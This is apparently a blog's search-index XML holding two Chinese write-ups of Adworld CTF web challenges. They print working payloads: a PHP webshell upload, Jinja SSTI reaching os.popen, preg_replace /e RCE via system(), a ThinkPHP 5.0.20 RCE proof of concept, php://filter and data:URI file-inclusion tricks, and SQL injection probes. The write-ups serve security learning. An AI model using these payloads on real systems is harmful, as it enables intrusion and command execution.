<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>攻防世界Web高手进阶区(二)</title>
    <link href="/2022/06/15/AdWorld-2/"/>
    <url>/2022/06/15/AdWorld-2/</url>
    
    <content type="html"><![CDATA[<h1 id="upload1"><a class="markdownIt-Anchor" href="#upload1"></a> upload1</h1><p>文件上传题，先上传一个图片试试看，文件名可以回显，利用时间戳进行随机命名</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085014026.png" alt="" /></p><p>接下来就是上马了，试试php一句话木马，有前端的限制</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085136843.png" alt="" /></p><p>改个后缀继续上传，被waf检测到了</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085422720.png" alt="" /></p><p>文件名再改回来，看看是不是waf对body进行过滤，看来是后缀php被过滤掉了，不对body进行检查</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085840865.png" alt="" /></p><p>不知道怎么回事，突然又上传成功了，莫名其妙，难道换个网络能禁掉waf？后来看别人的wp，居然没有遇到waf！<strong>看来这个病毒检测是我自己浏览器执行的，太tm坑了</strong>，我还在找各种后端绕过姿势😅</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091338595.png" alt="" /></p><p>总结来讲就是前端白名单过滤而已，没有后端限制，那不随便绕过</p><hr /><h1 id="web_python_template_injection"><a class="markdownIt-Anchor" href="#web_python_template_injection"></a> Web_python_template_injection</h1><p>看题目是python的模板注入，用wappalyzer分析一下，python2.7 + flask 0.15</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091944894.png" alt="" /></p><p>了解了解模板注入相关知识，hackbar自带各个服务器版本的模板注入, payload为</p><p><code>http://111.200.241.244:59314/&#123;&#123;g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611093627244.png" alt="" /></p><p>看到fl4g，cat得flag <code>ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125;</code></p><hr /><h1 id="easytornado"><a class="markdownIt-Anchor" href="#easytornado"></a> easytornado</h1><p>Tornado 框架，看看flag.txt里面有啥，它说在/fllllllllllllag里面</p><p>根据url是通过file页面传递filename变量进行文件查看，后面还跟一个hash值</p><p><code>111.200.241.244:58328/file?filename=/flag.txt&amp;filehash=fe0c9ba81112b2249b3f3b448b3b19e6</code></p><p>hash值的计算方法在hints.php里面</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611094503799.png" alt="" /></p><p>由于md5不可逆，关键是找到cookie_secret，网上找找tornado框架的cookie_secret相关知识</p><blockquote><p>官方文档关于安全cookie介绍 <a href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html#cookies-secure-cookies">认证和安全 — Tornado 4.3 文档 (tornado-zh.readthedocs.io)</a></p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611101509107.png" alt="" /></p><p>简而言之，<code>cookie_secret</code>保证完整性但不保证机密性，看看能不能用其他方式泄露<code>cookie_secret</code></p><p>看看第二个页面render函数有什么作用，render意为渲染；<code>self.render(&quot;entry.html&quot;, entry=entry)</code> 表示用entry.html这个模板，用右边entry来实例化该模板中的entry参数，从而显示在页面上。</p><p>在进行测试的时候出现以下页面，出错页面，通过msg变量进行渲染，看看能不能利用</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611102046955.png" alt="" /></p><p>尝试了一下服务器直接给我跪了，<s>调皮</s></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611105234034.png" alt="" /></p><p>查阅官方文档，<code>cookie_secret</code> 在Application对象settings的属性中 ，赋值handler.settings</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611111821319.png" alt="" /></p><p><code>cookie_secret</code>值为<code>93ee0919-c1d4-4e69-8f85-f23a4cc728c8</code>剩下的就是计算/fllllllllllllag的hash进行拼接</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611112400102.png" alt="" /></p><p>本题就是了解tornado框架的cookie_secret 和template render的利用</p><hr /><h1 id="shrine"><a class="markdownIt-Anchor" href="#shrine"></a> shrine</h1><p>源码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__) <br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>) <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read() <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>): <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>): <br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>] <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s <br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>这题看了半天，有几个比较疑惑的点</p><p>通过获取FLAG环境变量存放再app.config.里</p><p>但第二个路由我看不懂shrine的参数怎么给的，没有网络请求获取，也没有从路由里面获取，我在本地环境测试了下会报错</p><p>从路由获取的话是下面这个格式<code>@app.route('/shrine/&lt;shrine&gt;')</code></p><blockquote><p>通过把 URL 的一部分标记为 <code>&lt;variable_name&gt;</code> 就可以在 URL 中添加变量。标记的 部分会作为关键字参数传递给函数。通过使用 <code>&lt;converter:variable_name&gt;</code> ，可以 选择性的加上一个转换器，为变量指定规则。</p></blockquote><p>没办法咯，只能看wp😭，说是模板注入(<s>怎么个模板注入法，自己的环境复现不了</s>)，在靶机上试下</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220613202134087.png" alt="" /></p><p>黑名单会把config和self设为None，而我们正要获取app.config</p><p>获取flask的全局配置途径我也不太懂，直接粘贴下来，收集下来方便以后使用</p><p><code>current_app</code>为全局代理变量</p><p>payload为<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></p><hr /><h1 id="ics-05"><a class="markdownIt-Anchor" href="#ics-05"></a> ics-05</h1><blockquote><p>tips: 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p></blockquote><p>访问设备维护中心啥也没有，看看网络请求发现奇怪的东西<code>http://111.200.241.244:52497/somrthing.json?page=1&amp;limit=10</code></p><p>这个状态码为404，尝试对page的值进行爆破，但没什么卵用</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220614211204850.png" alt="" /></p><p>发现<code>http://111.200.241.244:51326/index.php?page=1</code> 有回显，试了试sqlmap，也没什么用</p><p>看wp发现使用伪协议，但这个不是在文件包含里面用的吗？<s>怎么发现的</s> 看来还是对这种url形式不敏感，读取源码</p><p><code>http://111.200.241.244:51326/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;input&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);<br>    &#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-keyword">die</span>();<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>看到确实是文件包含，不过将input，text等过滤掉了，防止我们直接RCE拿flag</p><p><strong><code>pre_replace</code></strong> 函数执行一个正则表达式的搜索和替换。</p><blockquote><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。</p></blockquote><p>方法明确了，构造xff，进入函数内部执行preg_replace实现RCE, payload如下</p><p><code>http://111.200.241.244:51326/index.php?pat=/bluearc/e&amp;rep=system('find -name *flag*')&amp;sub=bluearc</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093333178.png" alt="" /></p><blockquote><p>find  -name * <em>flag</em> * 该命令可以有效找到以当前目录环境下的所有flag</p><p>也可以 fine / -name * <em>flag</em> *</p></blockquote><p><code>http://111.200.241.244:51326/index.php?pat=/bluearc/e&amp;rep=system('./s3chahahaDir/flag/flag.php')&amp;sub=bluearc</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093806567.png" alt="" /></p><p><em><strong>总结一下</strong></em></p><ul><li><p>要对<code>?page=</code> 或者<code>?file=</code> 带回显的敏感一点，有可能是文件包含，然后通过伪协议获取源码</p></li><li><p>**<code>pre_replace</code>**的/e漏洞，导致RCE</p></li></ul><hr /><h1 id="lottery"><a class="markdownIt-Anchor" href="#lottery"></a> lottery</h1><p>注册账号买彩票，初始$20，消耗$2买一张</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615100711367.png" alt="image-20220615100711367" /></p><p>用burp抓包看了看，都是通过api.php的接口完成操作，没有可利用的点，给了一下提示，但抓包看没有折扣的地方</p><blockquote><p>Notice: You are offered a huge discount!</p></blockquote><p>必须得看源码，扫了下目录发现有git，解题点为<strong>git源码泄露</strong>，上git_extract脚本(后来发现题目给了源码)</p><p>审计了一下源码，money的值保存在**<code>$_SESSION</code>**会话中，在注册的时候赋值为20</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615112602398.png" alt="" /></p><p><strong><code>$_SESSION</code></strong> 对用户不可控，</p><h3 id="session的工作原理"><a class="markdownIt-Anchor" href="#session的工作原理"></a> session的工作原理</h3><blockquote><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息</p></blockquote><ul><li>存储: 可通过phpinfo查看session.save_path的值，即存储位置。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sess_PHPSESSID<br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sessions/sess_PHPSESSID<br><span class="hljs-regexp">/xxx/</span>tmp/sess_PHPSESSID<br><span class="hljs-regexp">/xxxx/</span>tmp<span class="hljs-regexp">/sessions/</span>sess_PHPSESSID<br></code></pre></td></tr></table></figure><ul><li>命名: session文件名格式为<code>sess_[phpsessid]</code>。而phpsessid来源于客户端存储的cookie字段。服务器会通过不同的session ID使用不同的文件</li></ul><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615144306598.png" alt="" /></p><p>即在session.save_path中该文件名为<code>sess_e59f658b4866e547c1118b4a3f48a3c1</code></p><ul><li>内容: 默认用session.serialize_handler的配置，对**<code>$_SESSION</code>**变量进行序列化后进行存储</li></ul><p>本题没有用到session的相关利用，一般是结合<strong>文件包含</strong></p><p>再次进行源码审计，有以下思路</p><ul><li>修改自己的money</li><li>降低flag的价格</li><li>绕过中奖判断机制</li></ul><p>第三个具有可行性，比较数字的时候是用弱类型比较</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615145548623.png" alt="" /></p><p><strong>数字比较可用true绕过</strong>，构造如下payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>111.200.241.244:65291<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.41<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://111.200.241.244:65291<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://111.200.241.244:65291/buy.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=033ccd6090ed9e7b2533a4803695805f<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;buy&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;numbers&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span> <span class="hljs-punctuation">,</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span> <span class="hljs-punctuation">,</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615151152237.png" alt="" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界Web高手进阶区(一)</title>
    <link href="/2022/06/10/AdWorld-1/"/>
    <url>/2022/06/10/AdWorld-1/</url>
    
    <content type="html"><![CDATA[<h1 id="baby_web"><a class="markdownIt-Anchor" href="#baby_web"></a> baby_web</h1><p>提示为初始页面，用dirsearch扫了下没结果，用brup遍历1-1000的php页面也没什么卵用，还是看wp吧 😭</p><p>访问初始页面index.php查看头部，居然这么简单（以后还是多用burp的repeater模块，edge自带的看的少）</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608162439760.png" alt="image-20220608162439760" /></p><p>这里访问index.php被重定向到1.php中，是通过<strong>响应头Location</strong>来实现的，状态码302跳转</p><hr /><h1 id="ics-06"><a class="markdownIt-Anchor" href="#ics-06"></a> ics-06</h1><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p><p>进报表中心看了看，发现确认按钮没啥用，也没找到其他有用的信息，发现url中id值，给他随便赋几个值，页面返回码都是200</p><p>所以可判断为id值的页面枚举，用burp的intruder模块 (<strong>给的提示是真的少</strong>)</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609110933902.png" alt="image-20220609110933902" /></p><p>id = 2333时页面大小发生变化，查看获得flag</p><p>说实话，这种要爆破的题出的不好，提示给的少，而且<strong>正确的数字又特别大</strong>，很难做出来</p><hr /><h1 id="training-www-robots"><a class="markdownIt-Anchor" href="#training-www-robots"></a> Training-WWW-Robots</h1><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608162820206.png" alt="image-20220608162820206" /></p><p>根据提示，robots协议中有时会泄露网站目录结构，访问robots.txt得到flag的页面fl0g.php，和新手区的题一样</p><hr /><h1 id="php2"><a class="markdownIt-Anchor" href="#php2"></a> PHP2</h1><p>页面提示 <em><strong>Can you anthenticate to this website?</strong></em></p><p>这是关于认证，代码审计相关，但给的提示太少了，尝试了下无果，直接看wp，发现 <strong>index.phps</strong>， 新姿势源码获取途径 get :happy:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>===<span class="hljs-variable">$_GET</span>[id]) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;admin&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过GET传入id值与admin进行强比较，若相等则退出，否则对它urldecode后再次进行弱比较拿到key</p><p>思路是对admin的一部分进行urlencode编码进行绕过，但这里需要明白一点，id值在传入时浏览器本身执行一次urldecode解码，所以要编码两次</p><blockquote><p>url编码表查看地址 : <a href="http://www.urlencode.com.cn/">UrlEncode编码和UrlDecode解码-在线URL编码解码工具</a></p></blockquote><p>di初始值为admin，我们对a进行编码<code>%61</code>，再对<code>%61</code>进行编码<code>%25%36%31</code>所以最终为 <em><strong>id=%25%36%31dmin</strong></em></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608165812303.png" alt="image-20220608165812303" /></p><p>或者直接用burp里的Decoder模块对admin进行两次编码</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608170051702.png" alt="image-20220608170051702" /></p><hr /><h1 id="php_rce"><a class="markdownIt-Anchor" href="#php_rce"></a> php_rce</h1><p>thinkphp V5.0.20版本的RCE漏洞，网上找一找公开的POC</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609170216160.png" alt="image-20220609170216160" /></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">GET ?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1<br>GET ?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609170307933.png" alt="" /></p><p>具体利用细节还没来得及分析复现，主要是框架中method方法过滤不严导致的RCE，以后有时间再看吧</p><hr /><h1 id="web_php_include"><a class="markdownIt-Anchor" href="#web_php_include"></a> Web_php_include</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过GET方式传递page变量，并且判断是否包含&quot;<strong>php://</strong>&quot;协议头，将它替换为空，最后包含该page变量</p><p>这里就涉及到php文件包含的相关知识，好久没做了，现在加深下印象</p><h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2><p>php中文件包含主要作用就是引用被包含文件的代码或者变量，达到代码复用的目的，类似于C语言的include和python中的import，<strong>利用点在于被包含的文件会以php方式来解析</strong>，下面是四种php文件包含的相关函数</p><ul><li><a href="http://www.php.net/manual/en/function.include.php">include()</a></li><li><a href="http://php.net/manual/en/function.include-once.php">include_once()</a></li><li><a href="http://php.net/manual/en/function.require.php">require()</a></li><li><a href="http://php.net/manual/en/function.require-once.php">require_once()</a></li></ul><p>include()与require()函数不同点在于，前者若文件包含出错(文件不存在等)只会提出警告，继续执行后续语句；后者出错时会触发fatal error从而直接退出，不执行后续语句</p><h3 id="lfilocal-file-inclusion"><a class="markdownIt-Anchor" href="#lfilocal-file-inclusion"></a> LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p><h3 id="rfiremote-file-inclusion"><a class="markdownIt-Anchor" href="#rfiremote-file-inclusion"></a> RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br />但RFI的利用条件较为苛刻，需要php.ini中进行配置</p><ul><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ul><blockquote><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p></blockquote><p>直接引用大佬的博客 <a href="https://blog.csdn.net/Fly_hps/article/details/80926992">PHP漏洞全解————10、PHP文件包含漏洞_FLy_鹏程万里的博客-CSDN博客</a></p><p>文件包含可利用的伪协议有</p><ul><li>php://input</li><li>php://filter</li><li>phar://</li><li>zip://</li><li>data:URI schema</li></ul><p>本题将php://协议ban掉(可以用PHP://大写绕过，str_replace函数的绕过)，看看能不能用其他协议代替，测试发现 <strong>data:URI schema</strong> 可行</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609201524626.png" alt="image-20220609201524626" /></p><p>访问了下啥都没有😩对它进行cat查看内容，发现没什么作用(后来才发现flag.php内容和index.php一模一样，flag藏起来了，坑！)</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609204204688.png" alt="image-20220609204204688" /></p><p>这题考察文件包含的伪协议应用以及相关绕过姿势，但最后的查找flag环节属实把我整不会了</p><hr /><h1 id="supersqli"><a class="markdownIt-Anchor" href="#supersqli"></a> supersqli</h1><p>看题目就是sql注入了，用的sqlmap跑了下，鉴定为布尔盲注，爆出来一个数据库名，但是表报不出来💁</p><p>没办法，只能手工注入了，尝试了下inject为注入点，判断注入类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1 # 正常回显</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> # 无回显<br></code></pre></td></tr></table></figure><p>判断一下为数字注入, 使用order by 判断列数，有两列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 #</span><br></code></pre></td></tr></table></figure><p>联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database() #</span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609234223032.png" alt="" 